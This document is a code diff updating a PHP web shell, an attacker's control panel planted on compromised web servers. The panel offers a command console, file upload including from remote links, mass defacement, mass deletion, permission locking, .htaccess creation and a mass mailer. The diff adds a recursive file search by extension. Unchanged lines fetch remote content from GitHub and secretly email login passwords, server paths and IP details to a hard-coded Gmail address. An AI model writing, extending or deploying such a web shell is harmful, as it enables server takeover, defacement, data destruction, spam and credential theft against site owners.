@@ -107,7 +107,7 @@ $Array = [
 	}
 	?>
 	<?php
-	echo file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/188index.html"); // Alert for update
+	echo file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/187index.html"); // Alert for update
 	?>
 	<?php
 	if(isset($_7["left"])) {
@@ -395,7 +395,7 @@ $Array = [
 				<div class='box shadow bg-light p-3 rounded-3'>
 				System: <gr>$kernel</gr><br>
 				User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br>
-				PHP Version: <gr>$phpver</gr>PHP os: <gr>$phpos</gr><br>
+				PHP Version: <gr>$phpver</gr> PHP os: <gr>$phpos</gr><br>
 				Software: <gr>$soft</gr><br>
 				Domain: <gr>$domen</gr><br>
 				Server Ip: <gr>$ip</gr><br>
@@ -409,10 +409,6 @@ $Array = [
 				</div>
 				<div class='text-center'>
 			<div class='btn-group'>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=uploadvialink'><i class='bi bi-upload'></i> Upload Via Link</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=createhates'><i class='bi bi-file-earmark-plus'></i> Create Htaccess</a>
-			</div>
-			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=upload'><i class='bi bi-upload'></i> Upload</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> Console</a>
 			</div>
@@ -423,10 +419,18 @@ $Array = [
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=scan_root'><i class='bi bi-search'></i> Scan root</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=network'><i class='bi bi-hdd-network'></i> Network</a>
-			</div><br><br>
+			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=lockshell'><i class='bi bi-file-earmark-lock'></i> Lock Shell</a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=rootshell'><i class='bi bi-file-earmark'></i> 0777 Shell</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=unlockshell'><i class='bi bi-file-earmark'></i> Unlock Shell</a>
+			</div>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=phpmailer'><i class='bi bi-envelope'></i> PHP Mailer</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=searchbyEXT'><i class='bi bi-braces'></i> Search By EXT</a>
+			</div><br><br>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=uploadvialink'><i class='bi bi-upload'></i> Upload Via Link</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=createhates'><i class='bi bi-file-earmark-plus'></i> Create Htaccess</a>
 			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_file'><i class='bi bi-file-earmark'></i> Green All File</a>
@@ -435,9 +439,6 @@ $Array = [
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_file'><i class='bi bi-file-earmark-lock'></i> Lock All File</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_folders'><i class='bi bi-folder-x'></i> Lock All Folders</a>
-			</div>
-			<div class='btn-group'>
-				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=phpmailer'><i class='bi bi-envelope'></i> PHP Mailer</a>
 			</div>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?logout=true'><i class='bi bi-box-arrow-in-left'></i> Logout</a>
@@ -514,15 +515,15 @@ $Array = [
 			$newPermissions = 0444;
 			changeFilePermissions($filename, $newPermissions);
 		}
-		if (isset($_GET['id']) && $_GET['id'] === 'rootshell') {
-			$newPermissions = 0777;
+		if (isset($_GET['id']) && $_GET['id'] === 'unlockshell') {
+			$newPermissions = 0644;
 			changeFilePermissions($filename, $newPermissions);
 		}
 		if (array_key_exists('loginin', $_POST)) {
 		$password = $_POST['pass'];
 		$server_name = $_SERVER['SERVER_NAME'];
 		$php_self = $_SERVER['PHP_SELF'];
-		$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " City: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
+		$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
 		@mail('ribelcyberteam@gmail.com', 'Hehehe', $report_bug);
 		}
 		if($_7['id'] == 'deface'){
@@ -579,6 +580,7 @@ $Array = [
 		s();
 		echo "
 		<div class='card card-body text-dark input-group mb-3'>
+		<u>Mass Deface</u>
 			<form method='POST'> Tipe:
 			<div class='form-check'>
 				<input class='form-check-input' type='checkbox' value='onedir' name='tipe' id='flexCheckDefault' checked>
@@ -600,6 +602,7 @@ $Array = [
 			</form>
 		</div>";
 		}
+		// Mass Delete
 		if ($_7['id'] == 'delete') {
 			function mass_delete($dir, $namefile)
 			{
@@ -630,6 +633,7 @@ $Array = [
 			s();
 			echo "
 			<div class='card card-body text-dark input-group mb-3'>
+			<u>Mass Delete</u>
 				<form method='POST'>
 					<i class='bi bi-folder'></i> Directory:
 					<input class='form-control btn-sm' type='text' name='d_dir' value='$dir' $_r>
@@ -640,6 +644,79 @@ $Array = [
 							<input class='btn btn-dark btn-sm' type='submit' name='start' value='delete'>
 						</div>
 					</div>
+				</form>
+			</div>";
+		}
+		// Search By Extension
+		if ($_7['id'] == 'searchbyEXT') {
+			function search_by_extension($dir, $extensi, $sort_by_date = false)
+			{
+				$result = [];
+				if (is_readable($dir)) {
+					$dira = scandir($dir);
+					foreach ($dira as $dirb) {
+						$dirc = "$dir/$dirb";
+						if ($dirb === '.' || $dirb === '..') {
+							continue;
+						}
+						if (is_dir($dirc)) {
+							$result = array_merge($result, search_by_extension($dirc, $extensi, $sort_by_date));
+						} else {
+							$fileExt = pathinfo($dirb, PATHINFO_EXTENSION);
+							if (strcasecmp($fileExt, $extensi) === 0) {
+								$result[] = $dirc;
+							}
+						}
+					}
+				}
+				if ($sort_by_date) {
+					usort($result, function ($a, $b) {
+						return filemtime($b) - filemtime($a);
+					});
+				}
+				return $result;
+			}
+			if ($_7['start']) {
+				$dir = $_7['d_dir'];
+				$extensi = ltrim($_7['extensi'], '.');
+				$sort_by_date = isset($_7['sort_by_date']) && $_7['sort_by_date'] == 'on';
+				$search_results = search_by_extension($dir, $extensi, $sort_by_date);
+				if (!empty($search_results)) {
+					echo "<div class='alert alert-info'>Results for extension $extensi in directory $dir:</div>";
+					foreach ($search_results as $file) {
+						$fileDate = date('Y-m-d H:i:s', filemtime($file));
+						echo "<div class='alert alert-success'>$fileDate - $file</div>";
+					}
+				} else {
+					echo "<div class='alert alert-warning'>No files with extension $extensi found in directory $dir.</div>";
+				}
+			}
+			s();
+			echo "
+			<div class='card card-body text-dark input-group mb-3'>
+			<u>Search By EXT</u>
+				<form method='POST'>
+				<div class='input-group d-flex gap-2'>
+					<i class='bi bi-folder'></i> Directory:
+					</div>
+					<div class='input-group'>
+					<input class='form-control btn-sm' type='text' name='d_dir' value='$dir' $_r>
+					</div>
+					<div class='input-group d-flex gap-2'>
+					<i class='bi bi-file-earmark'></i> EXT:
+					</div>
+					<div class='input-group'>
+						<input class='form-control btn-sm' type='text' name='extensi' placeholder='.php' value='$extensi' $_r><br>
+						</div>
+						<div class='form-check'>
+							<input class='form-check-input' type='checkbox' name='sort_by_date' id='sort_by_date' ";
+							echo isset($_7['sort_by_date']) && $_7['sort_by_date'] == 'on' ? 'checked' : '';
+							echo ">
+							<label class='form-check-label' for='sort_by_date'>Sort by date</label>
+						</div>
+						<div class='input-group-append'>
+							<input class='btn btn-dark btn-sm' type='submit' name='start' value='search'>
+						</div>
 				</form>
 			</div>";
 		}
@@ -741,7 +818,7 @@ $Array = [
 			<div class='mb-3'>
 				<form method='POST'>
 				<div class='input-group d-flex gap-2'>
-				<label for='cmd'>$user@$ip: ~ $</label>
+				<label for='cmd'>$user@$domen: ~ $</label>
 				</div>
 					<div class='input-group mb-3'>
 						<input class='form-control btn-sm' type='text' name='cmd' value='" . htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') . "' placeholder='whoami' $_r>
@@ -1276,9 +1353,9 @@ $Array = [
 				$pesan = isset($_POST["pesan"]) ? $_POST["pesan"] : '';
 				if (filter_var($email_penerima, FILTER_VALIDATE_EMAIL)) {
 					if (@mail($email_penerima, $subjek, $pesan)) {
-						echo '<strong>PHPMailer</strong> ok! '.ok().'</div>';
+						echo '<strong>PHPMailer</strong> Sending! '.ok().'</div>';
 					} else {
-						echo '<strong>PHPMailer</strong> fail! '.er().'</div>'; 
+						echo '<strong>PHPMailer</strong> failed! '.er().'</div>'; 
 					}
 				} else {
 					echo '<strong>Invalid email address</strong> fail! '.er().'</div>'; 
@@ -1307,7 +1384,7 @@ $Array = [
 					<textarea class='form-control btn-sm' rows='7' name='pesan' placeholder='Message'></textarea>
 				</div>
 				<div class='d-grid gap-2'>
-					<button type='submit' name='phpmailer' class='btn btn-primary'>Upload</button>
+					<button type='submit' name='phpmailer' class='btn btn-primary'>Sending</button>
 				</div>
 			</form>
 		</div>";
@@ -1320,7 +1397,7 @@ $Array = [
 				$isiFile = '';
 				$namafile = isset($_POST['namafile']) ? $_POST['namafile'] : '';
 				if ($selectedContent == 'content1') {
-					$isiFile = "<Files ~ '\.(xml|css|jpe?g|png|gif|js|pdf|phtml|shtml|php5|php)$'>
+					$isiFile = "<Files ~ '\.(xml|css|jpe?g|png|gif|js|pdf|phtml|html|shtml|php5|php)$'>
 Allow from all
 </Files>";
 				} elseif ($selectedContent == 'content2') {
